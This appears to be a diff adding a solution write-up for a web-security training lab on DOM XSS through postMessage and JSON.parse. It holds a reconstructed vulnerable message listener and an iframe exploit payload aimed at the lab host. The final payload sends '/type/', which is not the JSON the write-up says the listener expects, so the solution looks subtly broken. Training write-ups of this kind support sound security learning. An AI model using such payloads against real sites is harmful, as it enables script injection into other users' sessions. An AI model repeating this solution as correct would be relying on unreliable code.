@@ -1,0 +1,34 @@
+// Lab: DOM XSS using web messages and JSON.parse
+
+This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.
+
+
+
+// Solution
+
+1. Notice that the home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using JSON.parse(). In the JavaScript, we can see that the event listener expects a type property and that the load-channel case of the switch statement changes the iframe src attribute.
+
+When the page receives your message, it runs JSON.parse() on it.
+
+The message listener likely does something like:
+
+window.addEventListener('message', function(e) {
+    var iframe = document.createElement('iframe');
+    var ACMEplayer = {element: iframe};
+    var j;
+    try {
+        j = JSON.parse(e.data); // <-- expects JSON
+    } catch(e) {
+        return;
+    }
+    switch(j.type) {
+        case 'load-channel':
+            ACMEplayer.element.src = j.url; // <-- sink: iframe src
+            break;
+    }
+}, false);
+
+
+2. Inject the following exploit in exploit server:
+
+<iframe src="https://0a9b006d030bb2c3800930e8001000e2.web-security-academy.net/" onload="this.contentWindow.postMessage('/type/','*')"></iframe>
